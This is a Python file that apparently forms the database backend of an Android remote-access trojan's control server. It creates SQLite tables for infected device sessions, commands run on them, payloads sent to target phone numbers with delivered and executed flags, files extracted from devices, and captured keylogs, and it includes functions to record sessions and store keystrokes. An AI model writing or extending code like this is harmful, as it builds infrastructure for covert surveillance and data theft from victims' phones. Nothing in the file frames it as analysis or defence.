import sqlite3
import json
import datetime

class Database:
    def __init__(self, db_path="sessions.db"):
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.create_tables()
    
    def create_tables(self):
        cursor = self.conn.cursor()
        
        # Sessions table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT UNIQUE,
                device_name TEXT,
                device_model TEXT,
                android_version TEXT,
                ip_address TEXT,
                country TEXT,
                battery INTEGER,
                storage_total INTEGER,
                storage_used INTEGER,
                ram_total INTEGER,
                ram_used INTEGER,
                status TEXT,
                first_seen TEXT,
                last_seen TEXT
            )
        ''')
        
        # Commands history
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT,
                command TEXT,
                result TEXT,
                timestamp TEXT
            )
        ''')
        
        # Payloads
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS payloads (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                payload_id TEXT,
                target_number TEXT,
                sent_time TEXT,
                delivered BOOLEAN,
                executed BOOLEAN,
                status TEXT
            )
        ''')
        
        # Files extracted
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS extracted_files (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT,
                file_path TEXT,
                file_type TEXT,
                file_size INTEGER,
                extracted_time TEXT
            )
        ''')
        
        # Keylogs
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS keylogs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT,
                log_data TEXT,
                timestamp TEXT
            )
        ''')
        
        self.conn.commit()
    
    def add_session(self, session_id, device_info):
        cursor = self.conn.cursor()
        now = datetime.datetime.now().isoformat()
        
        cursor.execute('''
            INSERT OR REPLACE INTO sessions 
            (session_id, device_name, device_model, android_version, ip_address, country, 
             battery, storage_total, storage_used, ram_total, ram_used, status, first_seen, last_seen)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            session_id,
            device_info.get("name", "Unknown"),
            device_info.get("model", "Unknown"),
            device_info.get("android", "Unknown"),
            device_info.get("ip", "0.0.0.0"),
            device_info.get("country", "Unknown"),
            device_info.get("battery", 0),
            device_info.get("storage_total", 0),
            device_info.get("storage_used", 0),
            device_info.get("ram_total", 0),
            device_info.get("ram_used", 0),
            "active",
            now,
            now
        ))
        self.conn.commit()
    
    def update_session(self, session_id):
        cursor = self.conn.cursor()
        now = datetime.datetime.now().isoformat()
        cursor.execute('UPDATE sessions SET last_seen = ? WHERE session_id = ?', (now, session_id))
        self.conn.commit()
    
    def get_sessions(self):
        cursor = self.conn.cursor()
        cursor.execute('SELECT * FROM sessions WHERE status = "active" ORDER BY last_seen DESC')
        return cursor.fetchall()
    
    def add_command(self, session_id, command, result):
        cursor = self.conn.cursor()
        now = datetime.datetime.now().isoformat()
        cursor.execute('INSERT INTO commands (session_id, command, result, timestamp) VALUES (?, ?, ?, ?)',
                      (session_id, command, result, now))
        self.conn.commit()
    
    def add_keylog(self, session_id, log_data):
        cursor = self.conn.cursor()
        now = datetime.datetime.now().isoformat()
        cursor.execute('INSERT INTO keylogs (session_id, log_data, timestamp) VALUES (?, ?, ?)',
                      (session_id, log_data, now))
        self.conn.commit()
    
    def close(self):
        self.conn.close()

db = Database()
